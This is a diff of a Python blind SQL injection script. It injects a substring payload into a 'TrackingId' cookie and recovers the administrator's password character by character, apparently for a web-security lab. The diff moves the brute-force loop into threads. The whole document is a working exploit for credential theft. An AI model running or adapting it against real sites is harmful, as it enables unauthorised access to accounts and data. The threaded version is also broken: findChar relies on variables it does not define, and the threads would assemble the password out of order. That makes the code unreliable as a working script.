@@ -22,6 +22,21 @@ url = sys.argv[1]
 data = {}
 characters = string.printable
 
+def findChar(position, trackingIdCookie):
+    for char in characters:
+        if char == ';' or char == '\n':
+            continue
+        p1.status("check character %c in %d position" % (char, position))
+        payload = "' and substring((select password from users where username = 'administrator'),%d,1) = '%c' -- -" %(position,char)
+        injection = trackingIdCookie + payload
+        s.cookies.set('TrackingId', None)
+        s.cookies.set('TrackingId', injection)
+        r = s.get(url)
+        if ("Welcome" in r.text):
+            password += char
+            p2.status(password)
+            break
+
 def atacksqli():
     p1 = log.progress("Brute Force")
     p2 = log.progress("Password")
@@ -32,22 +47,14 @@ def atacksqli():
     cookies_init = s.cookies.get_dict()
     trackingIdCookie = cookies_init['TrackingId']
     password = ''
-    #threads = []
+    threads = []
     for position in range(1,40):
-        #thread = threading.Thread(target=findChar,args=(position))
-        for char in characters:
-            if char == ';' or char == '\n':
-                continue
-            p1.status("check character %c in %d position" % (char, position))
-            payload = "' and substring((select password from users where username = 'administrator'),%d,1) = '%c' -- -" %(position,char)
-            injection = trackingIdCookie + payload
-            s.cookies.set('TrackingId', None)
-            s.cookies.set('TrackingId', injection)
-            r = s.get(url)
-            if ("Welcome" in r.text):
-                password += char
-                p2.status(password)
-                break
+        thread = threading.Thread(target=findChar,args=(position,trackingIdCookie))
+        threads.append(thread)
+        thread.start()
+
+    for thread in threads:
+        thread.join()
 
 if __name__ == "__main__":
     atacksqli()
